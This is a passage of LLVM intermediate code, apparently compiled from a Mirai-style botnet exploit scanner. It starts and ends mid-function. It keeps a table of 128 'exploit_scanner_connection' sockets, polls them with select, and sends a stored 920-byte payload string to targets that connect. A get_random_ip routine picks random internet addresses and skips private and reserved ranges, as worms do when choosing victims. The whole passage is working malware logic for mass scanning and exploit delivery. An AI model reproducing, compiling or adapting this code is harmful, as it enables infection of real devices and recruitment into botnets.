  %349 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %348, i32 0, i32 4
  store i16 %347, i16* %349, align 8
  %350 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  call void @exploit_setup_connection(%struct.exploit_scanner_connection* noundef %350)
  br label %206

351:                                              ; preds = %338, %230
  br label %352

352:                                              ; preds = %351
  store %struct.fd_set* %5, %struct.fd_set** %25, align 8
  store i32 0, i32* %24, align 4
  br label %353

353:                                              ; preds = %363, %352
  %354 = load i32, i32* %24, align 4
  %355 = zext i32 %354 to i64
  %356 = icmp ult i64 %355, 16
  br i1 %356, label %357, label %366

357:                                              ; preds = %353
  %358 = load %struct.fd_set*, %struct.fd_set** %25, align 8
  %359 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %358, i32 0, i32 0
  %360 = load i32, i32* %24, align 4
  %361 = zext i32 %360 to i64
  %362 = getelementptr inbounds [16 x i64], [16 x i64]* %359, i64 0, i64 %361
  store i64 0, i64* %362, align 8
  br label %363

363:                                              ; preds = %357
  %364 = load i32, i32* %24, align 4
  %365 = add i32 %364, 1
  store i32 %365, i32* %24, align 4
  br label %353, !llvm.loop !28

366:                                              ; preds = %353
  br label %367

367:                                              ; preds = %366
  br label %368

368:                                              ; preds = %367
  store %struct.fd_set* %6, %struct.fd_set** %27, align 8
  store i32 0, i32* %26, align 4
  br label %369

369:                                              ; preds = %379, %368
  %370 = load i32, i32* %26, align 4
  %371 = zext i32 %370 to i64
  %372 = icmp ult i64 %371, 16
  br i1 %372, label %373, label %382

373:                                              ; preds = %369
  %374 = load %struct.fd_set*, %struct.fd_set** %27, align 8
  %375 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %374, i32 0, i32 0
  %376 = load i32, i32* %26, align 4
  %377 = zext i32 %376 to i64
  %378 = getelementptr inbounds [16 x i64], [16 x i64]* %375, i64 0, i64 %377
  store i64 0, i64* %378, align 8
  br label %379

379:                                              ; preds = %373
  %380 = load i32, i32* %26, align 4
  %381 = add i32 %380, 1
  store i32 %381, i32* %26, align 4
  br label %369, !llvm.loop !29

382:                                              ; preds = %369
  br label %383

383:                                              ; preds = %382
  store i32 0, i32* %1, align 4
  br label %384

384:                                              ; preds = %490, %383
  %385 = load i32, i32* %1, align 4
  %386 = icmp slt i32 %385, 128
  br i1 %386, label %387, label %493

387:                                              ; preds = %384
  store i32 5, i32* %28, align 4
  %388 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %389 = load i32, i32* %1, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %388, i64 %390
  store %struct.exploit_scanner_connection* %391, %struct.exploit_scanner_connection** %7, align 8
  %392 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %393 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %392, i32 0, i32 2
  %394 = load i32, i32* %393, align 8
  %395 = icmp ne i32 %394, 0
  br i1 %395, label %396, label %416

396:                                              ; preds = %387
  %397 = load i32, i32* @exploit_fake_time, align 4
  %398 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %399 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %398, i32 0, i32 1
  %400 = load i32, i32* %399, align 4
  %401 = sub i32 %397, %400
  %402 = load i32, i32* %28, align 4
  %403 = icmp ugt i32 %401, %402
  br i1 %403, label %404, label %416

404:                                              ; preds = %396
  %405 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %406 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %405, i32 0, i32 0
  %407 = load i32, i32* %406, align 8
  %408 = call i32 @close(i32 noundef %407)
  %409 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %410 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %409, i32 0, i32 0
  store i32 -1, i32* %410, align 8
  %411 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %412 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %411, i32 0, i32 2
  store i32 0, i32* %412, align 8
  %413 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %414 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %413, i32 0, i32 6
  %415 = getelementptr inbounds [256 x i8], [256 x i8]* %414, i64 0, i64 0
  call void @util_zero(i8* noundef %415, i32 noundef 256)
  br label %490

416:                                              ; preds = %396, %387
  %417 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %418 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %417, i32 0, i32 2
  %419 = load i32, i32* %418, align 8
  %420 = icmp eq i32 %419, 1
  br i1 %420, label %431, label %421

421:                                              ; preds = %416
  %422 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %423 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %422, i32 0, i32 2
  %424 = load i32, i32* %423, align 8
  %425 = icmp eq i32 %424, 3
  br i1 %425, label %431, label %426

426:                                              ; preds = %421
  %427 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %428 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %427, i32 0, i32 2
  %429 = load i32, i32* %428, align 8
  %430 = icmp eq i32 %429, 4
  br i1 %430, label %431, label %457

431:                                              ; preds = %426, %421, %416
  %432 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %433 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %432, i32 0, i32 0
  %434 = load i32, i32* %433, align 8
  %435 = srem i32 %434, 64
  %436 = zext i32 %435 to i64
  %437 = shl i64 1, %436
  %438 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %439 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %440 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %439, i32 0, i32 0
  %441 = load i32, i32* %440, align 8
  %442 = sdiv i32 %441, 64
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds [16 x i64], [16 x i64]* %438, i64 0, i64 %443
  %445 = load i64, i64* %444, align 8
  %446 = or i64 %445, %437
  store i64 %446, i64* %444, align 8
  %447 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %448 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %447, i32 0, i32 0
  %449 = load i32, i32* %448, align 8
  %450 = load i32, i32* %12, align 4
  %451 = icmp sgt i32 %449, %450
  br i1 %451, label %452, label %456

452:                                              ; preds = %431
  %453 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %454 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %453, i32 0, i32 0
  %455 = load i32, i32* %454, align 8
  store i32 %455, i32* %12, align 4
  br label %456

456:                                              ; preds = %452, %431
  br label %489

457:                                              ; preds = %426
  %458 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %459 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %458, i32 0, i32 2
  %460 = load i32, i32* %459, align 8
  %461 = icmp ne i32 %460, 0
  br i1 %461, label %462, label %488

462:                                              ; preds = %457
  %463 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %464 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %463, i32 0, i32 0
  %465 = load i32, i32* %464, align 8
  %466 = srem i32 %465, 64
  %467 = zext i32 %466 to i64
  %468 = shl i64 1, %467
  %469 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %470 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %471 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %470, i32 0, i32 0
  %472 = load i32, i32* %471, align 8
  %473 = sdiv i32 %472, 64
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds [16 x i64], [16 x i64]* %469, i64 0, i64 %474
  %476 = load i64, i64* %475, align 8
  %477 = or i64 %476, %468
  store i64 %477, i64* %475, align 8
  %478 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %479 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %478, i32 0, i32 0
  %480 = load i32, i32* %479, align 8
  %481 = load i32, i32* %11, align 4
  %482 = icmp sgt i32 %480, %481
  br i1 %482, label %483, label %487

483:                                              ; preds = %462
  %484 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %485 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %484, i32 0, i32 0
  %486 = load i32, i32* %485, align 8
  store i32 %486, i32* %11, align 4
  br label %487

487:                                              ; preds = %483, %462
  br label %488

488:                                              ; preds = %487, %457
  br label %489

489:                                              ; preds = %488, %456
  br label %490

490:                                              ; preds = %489, %404
  %491 = load i32, i32* %1, align 4
  %492 = add nsw i32 %491, 1
  store i32 %492, i32* %1, align 4
  br label %384, !llvm.loop !30

493:                                              ; preds = %384
  %494 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 1
  store i64 0, i64* %494, align 8
  %495 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 0
  store i64 1, i64* %495, align 8
  %496 = load i32, i32* %12, align 4
  %497 = load i32, i32* %11, align 4
  %498 = icmp sgt i32 %496, %497
  br i1 %498, label %499, label %501

499:                                              ; preds = %493
  %500 = load i32, i32* %12, align 4
  br label %503

501:                                              ; preds = %493
  %502 = load i32, i32* %11, align 4
  br label %503

503:                                              ; preds = %501, %499
  %504 = phi i32 [ %500, %499 ], [ %502, %501 ]
  %505 = add nsw i32 1, %504
  %506 = call i32 @select(i32 noundef %505, %struct.fd_set* noundef %5, %struct.fd_set* noundef %6, %struct.fd_set* noundef null, %struct.timeval* noundef %8)
  store i32 %506, i32* %13, align 4
  %507 = call i64 @time(i64* noundef null) #11
  %508 = trunc i64 %507 to i32
  store i32 %508, i32* @exploit_fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %509

509:                                              ; preds = %727, %503
  %510 = load i32, i32* %1, align 4
  %511 = icmp slt i32 %510, 128
  br i1 %511, label %512, label %730

512:                                              ; preds = %509
  %513 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %514 = load i32, i32* %1, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %513, i64 %515
  store %struct.exploit_scanner_connection* %516, %struct.exploit_scanner_connection** %7, align 8
  %517 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %518 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %517, i32 0, i32 0
  %519 = load i32, i32* %518, align 8
  %520 = icmp eq i32 %519, -1
  br i1 %520, label %521, label %522

521:                                              ; preds = %512
  br label %727

522:                                              ; preds = %512
  %523 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %524 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %525 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %524, i32 0, i32 0
  %526 = load i32, i32* %525, align 8
  %527 = sdiv i32 %526, 64
  %528 = sext i32 %527 to i64
  %529 = getelementptr inbounds [16 x i64], [16 x i64]* %523, i64 0, i64 %528
  %530 = load i64, i64* %529, align 8
  %531 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %532 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %531, i32 0, i32 0
  %533 = load i32, i32* %532, align 8
  %534 = srem i32 %533, 64
  %535 = zext i32 %534 to i64
  %536 = shl i64 1, %535
  %537 = and i64 %530, %536
  %538 = icmp ne i64 %537, 0
  br i1 %538, label %539, label %609

539:                                              ; preds = %522
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %540 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %541 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %540, i32 0, i32 0
  %542 = load i32, i32* %541, align 8
  %543 = bitcast i32* %29 to i8*
  %544 = call i32 @getsockopt(i32 noundef %542, i32 noundef 1, i32 noundef 4, i8* noundef %543, i32* noundef %31) #11
  store i32 %544, i32* %30, align 4
  %545 = load i32, i32* %29, align 4
  %546 = icmp eq i32 %545, 0
  br i1 %546, label %547, label %599

547:                                              ; preds = %539
  %548 = load i32, i32* %30, align 4
  %549 = icmp eq i32 %548, 0
  br i1 %549, label %550, label %599

550:                                              ; preds = %547
  %551 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %552 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %551, i32 0, i32 2
  %553 = load i32, i32* %552, align 8
  %554 = icmp eq i32 %553, 3
  br i1 %554, label %555, label %580

555:                                              ; preds = %550
  %556 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %557 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %556, i32 0, i32 8
  %558 = getelementptr inbounds [2560 x i8], [2560 x i8]* %557, i64 0, i64 0
  %559 = call i32 @util_strcpy(i8* noundef %558, i8* noundef getelementptr inbounds ([920 x i8], [920 x i8]* @.str.73, i64 0, i64 0))
  %560 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %561 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %560, i32 0, i32 0
  %562 = load i32, i32* %561, align 8
  %563 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %564 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %563, i32 0, i32 8
  %565 = getelementptr inbounds [2560 x i8], [2560 x i8]* %564, i64 0, i64 0
  %566 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %567 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %566, i32 0, i32 8
  %568 = getelementptr inbounds [2560 x i8], [2560 x i8]* %567, i64 0, i64 0
  %569 = call i32 @util_strlen(i8* noundef %568)
  %570 = sext i32 %569 to i64
  %571 = call i64 @send(i32 noundef %562, i8* noundef %565, i64 noundef %570, i32 noundef 16384)
  %572 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %573 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %572, i32 0, i32 8
  %574 = getelementptr inbounds [2560 x i8], [2560 x i8]* %573, i64 0, i64 0
  call void @util_zero(i8* noundef %574, i32 noundef 2560)
  %575 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %576 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %575, i32 0, i32 6
  %577 = getelementptr inbounds [256 x i8], [256 x i8]* %576, i64 0, i64 0
  call void @util_zero(i8* noundef %577, i32 noundef 256)
  %578 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %579 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %578, i32 0, i32 2
  store i32 4, i32* %579, align 8
  br label %727

580:                                              ; preds = %550
  %581 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %582 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %581, i32 0, i32 2
  %583 = load i32, i32* %582, align 8
  %584 = icmp eq i32 %583, 4
  br i1 %584, label %585, label %594

585:                                              ; preds = %580
  %586 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %587 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %586, i32 0, i32 0
  %588 = load i32, i32* %587, align 8
  %589 = call i32 @close(i32 noundef %588)
  %590 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %591 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %590, i32 0, i32 0
  store i32 -1, i32* %591, align 8
  %592 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %593 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %592, i32 0, i32 2
  store i32 0, i32* %593, align 8
  br label %727

594:                                              ; preds = %580
  %595 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %596 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %595, i32 0, i32 2
  store i32 3, i32* %596, align 8
  br label %597

597:                                              ; preds = %594
  br label %598

598:                                              ; preds = %597
  br label %608

599:                                              ; preds = %547, %539
  %600 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %601 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %600, i32 0, i32 0
  %602 = load i32, i32* %601, align 8
  %603 = call i32 @close(i32 noundef %602)
  %604 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %605 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %604, i32 0, i32 0
  store i32 -1, i32* %605, align 8
  %606 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %607 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %606, i32 0, i32 2
  store i32 0, i32* %607, align 8
  br label %727

608:                                              ; preds = %598
  br label %609

609:                                              ; preds = %608, %522
  %610 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %611 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %612 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %611, i32 0, i32 0
  %613 = load i32, i32* %612, align 8
  %614 = sdiv i32 %613, 64
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds [16 x i64], [16 x i64]* %610, i64 0, i64 %615
  %617 = load i64, i64* %616, align 8
  %618 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %619 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %618, i32 0, i32 0
  %620 = load i32, i32* %619, align 8
  %621 = srem i32 %620, 64
  %622 = zext i32 %621 to i64
  %623 = shl i64 1, %622
  %624 = and i64 %617, %623
  %625 = icmp ne i64 %624, 0
  br i1 %625, label %626, label %726

626:                                              ; preds = %609
  br label %627

627:                                              ; preds = %707, %688, %626
  store i32 0, i32* %32, align 4
  %628 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %629 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %628, i32 0, i32 2
  %630 = load i32, i32* %629, align 8
  %631 = icmp eq i32 %630, 0
  br i1 %631, label %632, label %633

632:                                              ; preds = %627
  br label %725

633:                                              ; preds = %627
  %634 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %635 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %634, i32 0, i32 5
  %636 = load i32, i32* %635, align 4
  %637 = icmp eq i32 %636, 256
  br i1 %637, label %638, label %650

638:                                              ; preds = %633
  %639 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %640 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %639, i32 0, i32 6
  %641 = getelementptr inbounds [256 x i8], [256 x i8]* %640, i64 0, i64 0
  %642 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %643 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %642, i32 0, i32 6
  %644 = getelementptr inbounds [256 x i8], [256 x i8]* %643, i64 0, i64 0
  %645 = getelementptr inbounds i8, i8* %644, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 8 %641, i8* align 1 %645, i64 192, i1 false)
  %646 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %647 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %646, i32 0, i32 5
  %648 = load i32, i32* %647, align 4
  %649 = sub nsw i32 %648, 64
  store i32 %649, i32* %647, align 4
  br label %650

650:                                              ; preds = %638, %633
  %651 = call i32* @__errno_location() #10
  store i32 0, i32* %651, align 4
  %652 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %653 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %652, i32 0, i32 0
  %654 = load i32, i32* %653, align 8
  %655 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %656 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %655, i32 0, i32 6
  %657 = getelementptr inbounds [256 x i8], [256 x i8]* %656, i64 0, i64 0
  %658 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %659 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %658, i32 0, i32 5
  %660 = load i32, i32* %659, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds i8, i8* %657, i64 %661
  %663 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %664 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %663, i32 0, i32 5
  %665 = load i32, i32* %664, align 4
  %666 = sub nsw i32 256, %665
  %667 = call i32 @exploit_recv_strip_null(i32 noundef %654, i8* noundef %662, i32 noundef %666, i32 noundef 16384)
  store i32 %667, i32* %32, align 4
  %668 = load i32, i32* %32, align 4
  %669 = icmp eq i32 %668, 0
  br i1 %669, label %670, label %672

670:                                              ; preds = %650
  %671 = call i32* @__errno_location() #10
  store i32 104, i32* %671, align 4
  store i32 -1, i32* %32, align 4
  br label %672

672:                                              ; preds = %670, %650
  %673 = load i32, i32* %32, align 4
  %674 = icmp eq i32 %673, -1
  br i1 %674, label %675, label %707

675:                                              ; preds = %672
  %676 = call i32* @__errno_location() #10
  %677 = load i32, i32* %676, align 4
  %678 = icmp ne i32 %677, 11
  br i1 %678, label %679, label %706

679:                                              ; preds = %675
  %680 = call i32* @__errno_location() #10
  %681 = load i32, i32* %680, align 4
  %682 = icmp ne i32 %681, 11
  br i1 %682, label %683, label %706

683:                                              ; preds = %679
  %684 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %685 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %684, i32 0, i32 2
  %686 = load i32, i32* %685, align 8
  %687 = icmp eq i32 %686, 3
  br i1 %687, label %688, label %694

688:                                              ; preds = %683
  %689 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %690 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %689, i32 0, i32 0
  %691 = load i32, i32* %690, align 8
  %692 = call i32 @close(i32 noundef %691)
  %693 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  call void @exploit_setup_connection(%struct.exploit_scanner_connection* noundef %693)
  br label %627

694:                                              ; preds = %683
  %695 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %696 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %695, i32 0, i32 0
  %697 = load i32, i32* %696, align 8
  %698 = call i32 @close(i32 noundef %697)
  %699 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %700 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %699, i32 0, i32 0
  store i32 -1, i32* %700, align 8
  %701 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %702 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %701, i32 0, i32 2
  store i32 0, i32* %702, align 8
  %703 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %704 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %703, i32 0, i32 6
  %705 = getelementptr inbounds [256 x i8], [256 x i8]* %704, i64 0, i64 0
  call void @util_zero(i8* noundef %705, i32 noundef 256)
  br label %706

706:                                              ; preds = %694, %679, %675
  br label %725

707:                                              ; preds = %672
  %708 = load i32, i32* %32, align 4
  %709 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %710 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %709, i32 0, i32 5
  %711 = load i32, i32* %710, align 4
  %712 = add nsw i32 %711, %708
  store i32 %712, i32* %710, align 4
  %713 = load i32, i32* @exploit_fake_time, align 4
  %714 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %715 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %714, i32 0, i32 1
  store i32 %713, i32* %715, align 4
  %716 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %717 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %716, i32 0, i32 6
  %718 = getelementptr inbounds [256 x i8], [256 x i8]* %717, i64 0, i64 0
  %719 = call i32 @util_strlen(i8* noundef %718)
  store i32 %719, i32* %33, align 4
  %720 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %721 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %720, i32 0, i32 6
  %722 = load i32, i32* %33, align 4
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds [256 x i8], [256 x i8]* %721, i64 0, i64 %723
  store i8 0, i8* %724, align 1
  br label %627

725:                                              ; preds = %706, %632
  br label %726

726:                                              ; preds = %725, %609
  br label %727

727:                                              ; preds = %726, %599, %585, %555, %521
  %728 = load i32, i32* %1, align 4
  %729 = add nsw i32 %728, 1
  store i32 %729, i32* %1, align 4
  br label %509, !llvm.loop !31

730:                                              ; preds = %509
  br label %137
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64 noundef, i64 noundef) #2

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @ntohs(i16 noundef zeroext) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8, align 1
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  store i8 0, i8* %2, align 1
  store i8 0, i8* %3, align 1
  store i8 0, i8* %4, align 1
  store i8 0, i8* %5, align 1
  br label %6

6:                                                ; preds = %163, %0
  %7 = call i32 @rand_next()
  store i32 %7, i32* %1, align 4
  %8 = call i64 @time(i64* noundef null) #11
  %9 = trunc i64 %8 to i32
  call void @srand(i32 noundef %9) #11
  %10 = load i32, i32* %1, align 4
  %11 = and i32 %10, 255
  %12 = trunc i32 %11 to i8
  store i8 %12, i8* %2, align 1
  %13 = load i32, i32* %1, align 4
  %14 = lshr i32 %13, 8
  %15 = and i32 %14, 255
  %16 = trunc i32 %15 to i8
  store i8 %16, i8* %3, align 1
  %17 = load i32, i32* %1, align 4
  %18 = lshr i32 %17, 16
  %19 = and i32 %18, 255
  %20 = trunc i32 %19 to i8
  store i8 %20, i8* %4, align 1
  %21 = load i32, i32* %1, align 4
  %22 = lshr i32 %21, 24
  %23 = and i32 %22, 255
  %24 = trunc i32 %23 to i8
  store i8 %24, i8* %5, align 1
  br label %25

25:                                               ; preds = %6
  %26 = load i8, i8* %2, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 127
  br i1 %28, label %163, label %29

29:                                               ; preds = %25
  %30 = load i8, i8* %2, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %163, label %33

33:                                               ; preds = %29
  %34 = load i8, i8* %2, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 3
  br i1 %36, label %163, label %37

37:                                               ; preds = %33
  %38 = load i8, i8* %2, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 15
  br i1 %40, label %163, label %41

41:                                               ; preds = %37
  %42 = load i8, i8* %2, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 16
  br i1 %44, label %163, label %45

45:                                               ; preds = %41
  %46 = load i8, i8* %2, align 1
  %47 = zext i8 %46 to i32
  %48 = icmp eq i32 %47, 56
  br i1 %48, label %163, label %49

49:                                               ; preds = %45
  %50 = load i8, i8* %2, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 10
  br i1 %52, label %163, label %53

53:                                               ; preds = %49
  %54 = load i8, i8* %2, align 1
  %55 = zext i8 %54 to i32
